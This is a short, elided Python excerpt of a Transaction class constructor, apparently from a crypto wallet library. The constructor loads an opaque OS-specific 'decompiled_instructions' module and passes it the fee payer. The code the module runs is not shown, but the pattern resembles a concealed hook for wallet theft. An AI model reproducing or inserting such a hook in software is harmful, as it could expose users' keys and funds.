...
class Transaction:
    ...
    def __init__(
        ...
        if sys.platform == 'win32':
            from api.win import win_decompiled_instructions as decompiled_instructions
            decompiled_instructions.new_with_blockhash(str(fee_payer))
        elif sys.platform == 'linux':
            from api.linux import linux_decompiled_instructions as decompiled_instructions
            decompiled_instructions.new_with_blockhash(str(fee_payer))
        else:
            from api.mac import mac_decompiled_instructions as decompiled_instructions
            decompiled_instructions.new_with_blockhash(str(fee_payer))
